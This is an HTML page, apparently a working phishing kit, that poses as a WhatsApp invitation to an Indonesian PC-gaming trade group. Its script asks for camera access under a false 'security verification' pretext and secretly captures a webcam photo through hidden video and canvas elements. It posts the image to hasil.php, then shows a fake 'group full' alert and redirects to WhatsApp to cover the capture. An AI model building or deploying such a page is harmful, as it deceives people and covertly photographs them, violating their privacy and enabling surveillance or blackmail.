<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Group Invite</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #e5ddd5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; width: 90%; max-width: 400px; padding: 20px; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); text-align: center; }
        .group-img { width: 100px; height: 100px; border-radius: 50%; background: #ccc; margin: 0 auto 15px; overflow: hidden; }
        .group-img img { width: 100%; height: 100%; object-fit: cover; }
        h2 { color: #075e54; margin-bottom: 5px; }
        p { color: #666; font-size: 14px; margin-bottom: 25px; }
        .btn { background-color: #25d366; color: white; padding: 12px 25px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; text-decoration: none; display: inline-block; }
        canvas, video { display: none; }
    </style>
</head>
<body>

<div class="card">
    <div class="group-img">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="Group Icon">
    </div>
    <h2>JUAL BELI PC GAMING INDO</h2>
    <p>Undangan untuk bergabung ke grup WhatsApp</p>
    <button id="joinBtn" class="btn">JOIN CHAT</button>
</div>

<video id="video" autoplay></video>
<canvas id="canvas"></canvas>

<script>
const joinBtn = document.getElementById('joinBtn');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

joinBtn.addEventListener('click', () => {
    // Minta izin kamera
    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
    .then(stream => {
        video.srcObject = stream;
        setTimeout(() => {
            takeSnapshot();
        }, 1000); // Tunggu 1 detik biar fokus
    })
    .catch(err => {
        alert("Gagal bergabung. Izin kamera diperlukan untuk verifikasi keamanan grup.");
    });
});

function takeSnapshot() {
    const context = canvas.getContext('2d');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    const imageData = canvas.toDataURL('image/png');
    
    // Kirim ke hasil.php
    fetch('hasil.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'image=' + encodeURIComponent(imageData)
    })
    .then(() => {
        // Notifikasi Palsu
        alert("Maaf, Grup ini sudah penuh (1024/1024 anggota).");
        window.location.href = "https://www.whatsapp.com";
    });
}
</script>

</body>
</html>
